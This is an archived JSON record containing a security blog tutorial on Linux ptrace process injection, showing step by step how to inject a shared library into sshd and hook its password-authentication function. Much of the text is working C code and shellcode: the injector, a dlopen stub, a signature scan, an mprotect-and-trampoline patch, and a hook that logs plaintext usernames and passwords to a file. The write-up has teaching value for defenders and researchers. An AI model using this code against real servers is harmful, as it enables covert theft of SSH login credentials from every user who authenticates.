{
    "id": "aaa78047-bd4b-4e30-b9f4-4737d184ac27",
    "created_at": "2023-01-12T15:00:17.44121Z",
    "updated_at": "2025-03-27T02:05:46.537721Z",
    "deleted_at": null,
    "sha1_hash": "f1d71ec84c9968d5426b6c4eea88285aed637c60",
    "title": "Linux ptrace introduction AKA injecting into sshd for fun",
    "authors": "",
    "file_creation_date": "2021-03-08T01:06:48Z",
    "file_modification_date": "2021-03-08T01:06:48Z",
    "file_size": 217485,
    "plain_text": "# Linux ptrace introduction AKA injecting into sshd for fun\n\n**[blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun](https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/)**\n\n[Â« Back to home](https://blog.xpnsec.com/)\nIf there is one thing I've come to appreciate over this past few weeks, it's just how much\nsupport you are provided from the Win32 API. That being said, I wanted to tackle some\nLinux process injection, with the aim of loading a shared object into another process address\nspace without having to resort to LD_PRELOAD, or stopping the process.\n\nThe goal I set myself was quite simple, could I recover plain text credentials from the sshd\nprocess using ptrace. Granted, this is a bit of an arbitrary goal, as there are many other ways\nto achieve the same result much more effectively (and with much less chance of SEGV), but I\nthought it would be cool to see this in action.\n\n## What is Ptrace\n\nFor anyone who has looked at process injection on Windows, you will probably be familiar\nwith the VirtualAllocEx(), WriteProcessMemory(), ReadProcessMemory(), and\nCreateRemoteThread() suite of calls. These are the common set of API methods used to\nallocate and execute a thread in another process. In the Linux world, the kernel exposes\nptrace, which offers debuggers the ability to interfere with a running process.\n\nPtrace offers a number of useful operations for debugging, including:\n\nPTRACE_ATTACH - Allows one process to attach itself to another for debugging,\npausing the remote process.\nPTRACE_PEEKTEXT - Allows the reading of memory from another process address\nspace.\nPTRACE_POKETEXT - Allows the writing of memory to another process address\nspace.\nPTRACE_GETREGS - Reads the current set of processor registers from a process.\nPTRACE_SETREGS - Writes to the current set of processor registers of a process.\nPTRACE_CONT - Resumes the execution of an attached process.\n\nWhilst this isn't an exhaustive list of ptrace functionality, the difficulty I found coming from a\nWin32 background was the lack of supporting functions. For example, in Windows you can\nallocate memory in a process via VirtualAllocEx, in which you are provided with a pointer to\na freshly allocated space to write your warez. In ptrace however, this doesn't appear to exist,\nwhich means you have to improvise when wanting to do something like inject code into\nanother process.\n\nThat being said, let's walk through how we can achieve control over another process using\nptrace.\n\n\n-----\n\n## Ptrace Concepts\n\nWhen beginning a typical session, the first thing that we want to do is attach to the process\nthat we will be targeting. To do this, we call ptrace with the PTRACE_ATTACH parameter:\n```\nptrace(PTRACE_ATTACH, pid, NULL, NULL);\n\n```\nThis call is pretty straight forward, it takes the PID of the process we want to target. When\ncalled, a SIGSTOP is sent, resulting in the process pausing its execution.\n\nOnce attached, we will need to take a backup of the current state of the processor registers\nbefore we make any modifications. This will allow us to resume execution at a later stage:\n```\nstruct user_regs_struct oldregs;\nptrace(PTRACE_GETREGS, pid, NULL, &oldregs);\n\n```\nNext, we need to find a place within the process where we can write our injected code. The\neasiest way to do this is to parse the \"maps\" file located in procfs for the target. For example,\nthe \"/proc/PID/maps\" file for a running sshd process on Ubuntu looks like this:\n\nWe need to search for a section which is mapped with execute permission (likely this will be\n\"r-xp\"). Once found, similar to the process registers, we will need to backup the existing data\nfrom the target section to allow us to recover at a later stage. We do this using\nPTRACE_PEEKTEXT:\n```\nptrace(PTRACE_PEEKTEXT, pid, addr, NULL);\n\n```\nWhen called in this way, 1 word of data (32 bits on x86, or 64 bits on x86-64 Linux) will be\nread from the address provided, meaning repeated calls must be made with an incrementing\naddress parameter.\n\n_Please note: Linux also provides process_vm_readv() and process_vm_writev() for_\n_reading/writing to process memory. For the purpose of this tutorial I will stick with ptrace,_\n_however if you are looking to implement something yourself, it is worth checking these calls_\n_out._\n\n\n-----\n\nNow that we have backed up the parts of the target process we are about to clobber, we can\nstart overwriting our chosen executable section using PTRACE_POKETEXT:\n```\nptrace(PTRACE_POKETEXT, pid, addr, word);\n\n```\nSimilar to PTRACE_PEEKTEXT, this call deals with 1 word of data at a time, and accepts an\naddress to write to. And similar to PTRACE_PEEKTEXT, multiple calls are required to\nachieve anything more that a 1 word write.\n\nOnce we have written our code, we will want to update the processes instruction pointer\nregister to point to our injected code. To keep us from overwriting data in memory (such as\ndata held on the stack), we will use the same registers that we backed up earlier, updating\nonly where needed:\n```\nstruct user_regs_struct regs;\nmemcpy(&regs, &oldregs, sizeof(struct user_regs_struct));\n// Update RIP to point to our injected code\nregs.rip = addr_of_injected_code;\nptrace(PTRACE_SETREGS, pid, NULL, &regs);\n\n```\nFinally, we can use PTRACE_CONT to resume execution:\n```\nptrace(PTRACE_CONT, pid, NULL, NULL);\n\n```\nBut how do we know when our injected code has finished executing? We use a software\ninterrupt, such as a \"int 0x3\" instruction, which will generate a SIGTRAP. We listen for this\nsignal using a waitpid() call as follows:\n```\nwaitpid(pid, &status, WUNTRACED);\n\n```\nwaitpid() will block until the process corresponding to the provided PID pauses execution,\nand writes the reason to the \"status\" variable. Thankfully there are a number of macro's\navailable which make life a bit easier in helping us understand the reason for the pause.\n\nTo tell if control has been paused because of a SIGTRAP (caused by our \"int 0x03\"\ninstruction), we can use:\n```\nwaitpid(pid, &status, WUNTRACED);\nif (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {\n  printf(\"SIGTRAP received\\n\");\n}\n\n```\nAt this point, we know that our injected code has executed, and just need to restore the\nprocess back to its original state. This is simply a case of recovering the original registers:\n```\nptrace(PTRACE_SETREGS, pid, NULL, &origregs);\n\n```\nWriting the original memory back to the process:\n\n\n-----\n\n```\nptrace(PTRACE_POKETEXT, pid, addr, word);\n\n```\nAnd detaching from the process to resume execution:\n```\nptrace(PTRACE_DETACH, pid, NULL, NULL);\n\n```\nOK, enough of the theory, lets move onto something a bit more interesting.\n\n## Injecting into SSH\n\n_I should probably warn you that there is of course the possibility of crashing sshd for other_\n_users, so be careful, and obviously please don't test this on a live system or a system you are_\n_remotely SSH'd into :D_\n\n_Additionally, there are a number of better ways to achieve a similar effect, I illustrate this_\n_technique purely as a fun way to show ptrace's power (and it beats injecting a Hello World_\n_;)_\n\n[If you would like to follow along, I would suggest taking a look at the final code here.](https://github.com/xpn/ssh-inject)\n\nSo one thing that I wanted to do was to recover username and password combinations from a\nrunning sshd process when a user authenticates. Reviewing the sshd source code, we can see\nthe following:\n\n[https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c](https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c)\n```\n/*\n * Tries to authenticate the user using password. Returns true if\n * authentication succeeds.\n */\n int\n auth_password(Authctxt *authctxt, const char *password)\n {\n ...\n }\n\n```\nThis looks like a nice place to hook and recover plain-text credentials when provided by the\nuser.\n\nNow, we want to find a signature of this function which will allow us to search for it in\nmemory. To do this, I used my favourite disassembly tool, radare2, to disassemble SSH on\n[my Vagrant box:](https://www.vagrantup.com/)\n\n\n-----\n\nWe need to find a set of bytes in the file which is unique to \"auth_password\" function. To do\nthis, we use radare2's hex search to find a single matching signature:\n\nIt appears that the `xor rdx,rdx; cmp rax,`\n```\n0x400; instructions are unique to this function,\n\n```\nreturning only a single match in the ELF file, so\nwe will use this as our signature.\n\nAs a side note... if you don't see this signature in\nyour version of sshd, you may want to ensure\n[your version is up to date, as this is actually protecting against a vulnerability fixed mid 2016.](http://www.openssh.com/txt/release-7.3)\n\nNext we will need to inject our code into the sshd process.\n\n## Injecting a .so into sshd\n\nTo load our code into sshd, we are going to inject a very small stub, which will use dlopen() to\nload a shared library which will perform the hooking of \"auth_password\".\n\ndlopen() is a dynamic linker call, which receives a path to a shared library as an argument,\nand loads the library into the calling process. This function is included within libdl.so, which\nis usually dynamically linked to your application during compile time.\n\n\n-----\n\nThankfully, in our case, libdl.so is already present in sshd, so all we need to do is to call\ndlopen() with our injected code. However, due to ASLR, it's very unlikely that dlopen() will\nbe at the same address each time, so we must calculate its address within the sshd process.\n\nTo find the address of the function, we are going to first calculate the difference between\nlibdl.so's base address to the dlopen() function. This can be done with the following:\n```\nunsigned long long libdlAddr, dlopenAddr;\nlibdlAddr = (unsigned long long)dlopen(\"libdl.so\", RTLD_LAZY);\ndlopenAddr = (unsigned long long)dlsym(libdlAddr, \"dlopen\");\nprintf(\"Offset: %llx\\n\", dlopenAddr - libdlAddr);\n\n```\nOnce we have the offset, we can parse the \"maps\" file of sshd for libdl.so, and recover the\nbase address:\n\nHaving now found the base address of libdl.so within sshd (0x7f0490a0d000 in the map file\nabove), we can add our calculated offset to this address and know where dlopen() will be\nwhen called by our injected code.\n\nTo pass this address across to our injected code, we will use a register which we will set using\nPTRACE_SETREGS.\n\nWe will also need to write the path to our shared library into the sshd process, which we will\nalso pass via a register to our injected stub, for example:\n```\nvoid ptraceWrite(int pid, unsigned long long addr, void *data, int len) {\n long word = 0;\n int i = 0;\n for (i=0; i < len; i+=sizeof(word), word=0) {\n  memcpy(&word, data + i, sizeof(word));\n  if (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == -1) {\n   printf(\"[!] Error writing process memory\\n\");\n   exit(1);\n  }\n }\n}\nptraceWrite(pid, (unsigned long long)freeaddr, \"/tmp/inject.so\\x00\", 16)\n\n```\nBy offloading as much as possible to the injecting process, and setting registers before calling\nour stub, we can keep our injected code very simple, for example:\n\n\n-----\n\n```\n// Update RIP to point to our code, which will be just after \n// our injected library name string\nregs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN;\n// Update RAX to point to dlopen()\nregs.rax = (unsigned long long)dlopenAddr;\n// Update RDI to point to our library name string\nregs.rdi = (unsigned long long)freeaddr;\n// Set RSI as RTLD_LAZY for the dlopen call\nregs.rsi = 2;  // RTLD_LAZY\n// Update the target process registers\nptrace(PTRACE_SETREGS, pid, NULL, &regs);\n\n```\nThis means that our injected stub is simply:\n```\n; RSI set as value '2' (RTLD_LAZY)\n; RDI set as char* to shared library path\n; RAX contains the address of dlopen\ncall rax\nint 0x03\n\n```\nNext, we need to create our shared library which will be loaded by our injected stub.\n\nBefore moving on, let's look at an important concept that will be used when injecting a\nshared library... shared object constructors.\n\n## Shared Object Constructor\n\nA shared library supports the ability to execute code upon load, by using the\n__attribute__((constructor)) decorator. For example:\n```\n#include <stdio.h>\nvoid __attribute__((constructor)) test(void) {\n  printf(\"Library loaded on dlopen()\\n\");\n}\n\n```\nWe can compile this shared object using the following GCC command:\n```\ngcc -o test.so --shared -fPIC test.c\n\n```\nAnd test using dlopen():\n```\ndlopen(\"./test.so\", RTLD_LAZY);\n\n```\nWhen the library is loaded, we see that our constructor is also called:\n\nWe will be using this functionality to make our life a bit easier when it comes to injecting our\nshared object into another process space.\n\n\n-----\n\n## sshd Shared Object\n\nNow we have the ability to inject our shared library, we need to craft our code to patch the\nauth_password() function during runtime.\n\nWhen our shared library is loaded, we can find the base address of sshd via the\n\"/proc/self/maps\" procfs file. We are looking for the \"r-x\" protected section of sshd within\nthis file, which will give us the start and end address we will need to search for our\nauth_password() signature:\n```\nfd = fopen(\"/proc/self/maps\", \"r\");\nwhile(fgets(buffer, sizeof(buffer), fd)) {\n  if (strstr(buffer, \"/sshd\") && strstr(buffer, \"r-x\")) {\n    ptr = strtoull(buffer, NULL, 16);\n    end = strtoull(strstr(buffer, \"-\")+1, NULL, 16);\n    break;\n  }\n}\n\n```\nOnce we have our target memory range, we want to hunt for our signature:\n```\nconst char *search = \"\\x31\\xd2\\x48\\x3d\\x00\\x04\\x00\\x00\";\nwhile(ptr < end) {\n  // ptr[0] == search[0] added to increase performance during searching\n  // no point calling memcmp if the first byte doesn't match our signature.\n  if (ptr[0] == search[0] && memcmp(ptr, search, 9) == 0) {\n    break;\n  }\n  ptr++;\n}\n\n```\nAnd once we have our match, we need to use mprotect() to update the memory protection.\nThis is because the section is mapped with only read and execute permissions, and we need\nwrite permissions to overwrite the code during runtime:\n```\nmprotect((void*)(((unsigned long long)ptr / 4096) * 4096), 4096*2, PROT_READ |\nPROT_WRITE | PROT_EXEC)\n\n```\nNow that we have permission to write to this segment, we will add our hook to the start of the\nfunction. To save writing the bulk of our hook in assembly, we will use a small trampoline,\nwhich will look like this:\n```\nchar jmphook[] = \"\\x48\\xb8\\x48\\x47\\x46\\x45\\x44\\x43\\x42\\x41\\xff\\xe0\";\n\n```\nThis translates to the following:\n\n\n-----\n\n```\nmov rax, 0x4142434445464748\njmp rax\n\n```\nOf course 0x4142434445464748 is an invalid address which we will replace with the value of\nour hook function:\n```\n*(unsigned long long *)((char*)jmphook+2) = &passwd_hook;\n\n```\nThen we can simply add our trampoline to the sshd function. To keep the injection nice and\nclean, I chose to add this to the beginning of the function:\n```\n// Step back to the start of the function, which is 32 bytes \n// before our signature\nptr -= 32;\nmemcpy(ptr, jmphook, sizeof(jmphook));\n\n```\nFinally, we have our hook function which takes care of logging the passed credentials. We\nmust make sure that we store a copy of the registers before the hook, and restore the registers\nbefore returning to the original code:\n\n\n-----\n\n```\n// Remember the prolog: push rbp; mov rbp, rsp; \n// that takes place when entering this function\nvoid passwd_hook(void *arg1, char *password) {\n  // We want to store our registers for later\n  asm(\"push %rsi\\n\"\n    \"push %rdi\\n\"\n    \"push %rax\\n\"\n    \"push %rbx\\n\"\n    \"push %rcx\\n\"\n    \"push %rdx\\n\"\n    \"push %r8\\n\"\n    \"push %r9\\n\"\n    \"push %r10\\n\"\n    \"push %r11\\n\"\n    \"push %r12\\n\"\n    \"push %rbp\\n\"\n    \"push %rsp\\n\"\n    );\n  // Our code here, is used to store the username and password\n  char buffer[1024];\n  int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND);\n  // Note: The magic offset of \"arg1 + 32\" contains a pointer to \n  // the username from the passed argument.\n  snprintf(buffer, sizeof(buffer), \"Password entered: [%s] %s\\n\", *(void **)(arg1 +\n32), password);\n  write(log, buffer, strlen(buffer));\n  close(log);\n  asm(\"pop %rsp\\n\"\n    \"pop %rbp\\n\"\n    \"pop %r12\\n\"\n    \"pop %r11\\n\"\n    \"pop %r10\\n\"\n    \"pop %r9\\n\"\n    \"pop %r8\\n\"\n    \"pop %rdx\\n\"\n    \"pop %rcx\\n\"\n    \"pop %rbx\\n\"\n    \"pop %rax\\n\"\n    \"pop %rdi\\n\"\n    \"pop %rsi\\n\"\n    );\n  // Recover from the function prologue\n  asm(\"mov %rbp, %rsp\\n\"\n    \"pop %rbp\\n\"\n    );\n  ...\n\n```\nAnd that's it... well, kind of...\n\n\n-----\n\nUnfortunately, even after all that, we still have a little bit left to do. If you jumped ahead and\ninjected your code into the sshd process, you will probably notice that credentials are not be\navailable to you. This is due to the way in which sshd spawns a child process for each new\nconnection. It is this child process which actually handles the authentication of the user, and\nthis child process that we need to hook.\n\nTo make sure we are targeting the child processes of sshd, I settled on a method of scanning\nthe procfs filesystem for the \"stats\" file holding a PPID of the sshd process. When found, our\ninjector will be run against this new process.\n\nThere is actually a benefit of doing our injection in this way. If the worst does happen and\nyour injected code causes a SIGSEGV, you are only killing the child process, and not the main\nsshd daemon parent process. It's not much of a consolation, but it makes debugging a whole\nlot easier :D\n\n## Injector in action\n\nHopefully this journey gives you enough information to start tackling ptrace yourself. If you\nhave any further comments or questions, you can find me hanging out in the usual places.\n\nI would like to pass my thanks to the following people and sites, which helped me to\nunderstand ptrace beyond the wall of text that is the ptrace man pages:\n\nGaffe23's de-facto standard linux inject toolset - https://github.com/gaffe23/linuxinject\nEvilSocket's awesome write-up on process injection https://www.evilsocket.net/2015/05/01/dynamically-inject-a-shared-library-into-arunning-process-on-androidarm/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Process Injection/Linux ptrace introduction AKA injecting into sshd for fun.pdf"
    ],
    "report_names": [
        "Linux ptrace introduction AKA injecting into sshd for fun.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535617,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1615165608,
    "ts_modification_date": 1615165608,
    "files": {
        "pdf": "https://archive.orkl.eu/f1d71ec84c9968d5426b6c4eea88285aed637c60.pdf",
        "text": "https://archive.orkl.eu/f1d71ec84c9968d5426b6c4eea88285aed637c60.txt",
        "img": "https://archive.orkl.eu/f1d71ec84c9968d5426b6c4eea88285aed637c60.jpg"
    }
}